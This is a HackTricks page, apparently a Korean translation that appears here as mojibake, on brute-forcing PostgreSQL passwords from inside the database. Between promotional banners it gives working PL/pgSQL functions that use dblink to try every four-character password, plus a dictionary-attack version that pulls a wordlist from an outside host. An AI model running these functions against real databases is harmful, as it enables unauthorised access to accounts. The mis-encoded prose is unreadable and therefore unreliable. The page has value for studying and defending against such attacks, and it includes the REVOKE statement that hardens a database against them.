# PL/pgSQL ë¹„ë°€ë²ˆí˜¸ ë¸Œë£¨íŠ¸í¬ìŠ¤

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤**í•˜ê±°ë‚˜ HackTricksë¥¼ **PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ì— ì œì¶œí•˜ì„¸ìš”.**

</details>

**ì›ë³¸ ë…¼ë¬¸ì—ì„œ ì´ ê³µê²©ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ë¥¼ ì°¾ì•„ë³´ì„¸ìš”](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**.

PL/pgSQLì€ SQLì˜ ê¸°ëŠ¥ì„ í™•ì¥í•˜ì—¬ **í”„ë¡œì‹œì € ì œì–´ë¥¼ í–¥ìƒì‹œí‚¤ëŠ”** ì™„ì „í•œ ê¸°ëŠ¥ì„ ê°–ì¶˜ í”„ë¡œê·¸ë˜ë° ì–¸ì–´ì…ë‹ˆë‹¤. ì´ëŠ” ë£¨í”„ì™€ ë‹¤ì–‘í•œ ì œì–´ êµ¬ì¡°ì˜ í™œìš©ì„ í¬í•¨í•©ë‹ˆë‹¤. PL/pgSQL ì–¸ì–´ë¡œ ì‘ì„±ëœ í•¨ìˆ˜ëŠ” SQL ë¬¸ê³¼ íŠ¸ë¦¬ê±°ì—ì„œ í˜¸ì¶œë  ìˆ˜ ìˆìœ¼ë©°, ë°ì´í„°ë² ì´ìŠ¤ í™˜ê²½ ë‚´ì—ì„œì˜ ì‘ì—… ë²”ìœ„ë¥¼ í™•ì¥í•©ë‹ˆë‹¤.

ì´ ì–¸ì–´ë¥¼ ë‚¨ìš©í•˜ì—¬ PostgreSQLì—ê²Œ ì‚¬ìš©ì ìê²© ì¦ëª…ì„ ë¸Œë£¨íŠ¸í¬ìŠ¤í•˜ë„ë¡ í•  ìˆ˜ ìˆì§€ë§Œ, ë°ì´í„°ë² ì´ìŠ¤ì— ì¡´ì¬í•´ì•¼ í•©ë‹ˆë‹¤. ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ ì¡´ì¬ ì—¬ë¶€ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
lanname | lanacl
---------+---------
plpgsql |
```
ê¸°ë³¸ì ìœ¼ë¡œ, **í•¨ìˆ˜ ìƒì„±ì€ PUBLICì—ê²Œ ë¶€ì—¬ëœ ê¶Œí•œ**ì…ë‹ˆë‹¤. ì—¬ê¸°ì„œ PUBLICì€ í•´ë‹¹ ë°ì´í„°ë² ì´ìŠ¤ ì‹œìŠ¤í…œì˜ ëª¨ë“  ì‚¬ìš©ìë¥¼ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ ê´€ë¦¬ìëŠ” PUBLIC ë„ë©”ì¸ì—ì„œ USAGE ê¶Œí•œì„ ì·¨ì†Œí•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
```sql
REVOKE ALL PRIVILEGES ON LANGUAGE plpgsql FROM PUBLIC;
```
ê·¸ ê²½ìš°ì—ëŠ”, ì´ì „ì˜ ì¿¼ë¦¬ëŠ” ë‹¤ë¥¸ ê²°ê³¼ë¥¼ ì¶œë ¥í•  ê²ƒì…ë‹ˆë‹¤:
```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
lanname | lanacl
---------+-----------------
plpgsql | {admin=U/admin}
```
ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ê°€ ì‘ë™í•˜ë ¤ë©´ **`dblink` í•¨ìˆ˜ê°€ ì¡´ì¬í•´ì•¼ í•©ë‹ˆë‹¤**. ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê²½ìš° ë‹¤ìŒê³¼ ê°™ì´ ìƒì„±í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```sql
CREATE EXTENSION dblink;
```
## ë¹„ë°€ë²ˆí˜¸ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©

ë‹¤ìŒì€ 4ìë¦¬ ë¹„ë°€ë²ˆí˜¸ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ìˆ˜í–‰í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤:
```sql
//Create the brute-force function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
username TEXT, dbname TEXT) RETURNS TEXT AS
$$
DECLARE
word TEXT;
BEGIN
FOR a IN 65..122 LOOP
FOR b IN 65..122 LOOP
FOR c IN 65..122 LOOP
FOR d IN 65..122 LOOP
BEGIN
word := chr(a) || chr(b) || chr(c) || chr(d);
PERFORM(SELECT * FROM dblink(' host=' || host ||
' port=' || port ||
' dbname=' || dbname ||
' user=' || username ||
' password=' || word,
'SELECT 1')
RETURNS (i INT));
RETURN word;
EXCEPTION
WHEN sqlclient_unable_to_establish_sqlconnection
THEN
-- do nothing
END;
END LOOP;
END LOOP;
END LOOP;
END LOOP;
RETURN NULL;
END;
$$ LANGUAGE 'plpgsql';

//Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
_ì°¸ê³ ë¡œ, 4ìë¦¬ë¥¼ ë¬´ì°¨ë³„ ëŒ€ì…í•´ë„ ëª‡ ë¶„ì´ ê±¸ë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤._

ë˜í•œ **ì›Œë“œë¦¬ìŠ¤íŠ¸ë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ì—¬ í•´ë‹¹ ë¹„ë°€ë²ˆí˜¸ë§Œ ì‹œë„í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤ (ì‚¬ì „ ê³µê²©):
```sql
//Create the function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
username TEXT, dbname TEXT) RETURNS TEXT AS
$$
BEGIN
FOR word IN (SELECT word FROM dblink('host=1.2.3.4
user=name
password=qwerty
dbname=wordlists',
'SELECT word FROM wordlist')
RETURNS (word TEXT)) LOOP
BEGIN
PERFORM(SELECT * FROM dblink(' host=' || host ||
' port=' || port ||
' dbname=' || dbname ||
' user=' || username ||
' password=' || word,
'SELECT 1')
RETURNS (i INT));
RETURN word;

EXCEPTION
WHEN sqlclient_unable_to_establish_sqlconnection THEN
-- do nothing
END;
END LOOP;
RETURN NULL;
END;
$$ LANGUAGE 'plpgsql'

-- Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? ì•„ë‹ˆë©´ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ì— ì œì¶œí•˜ì„¸ìš”.**

</details>
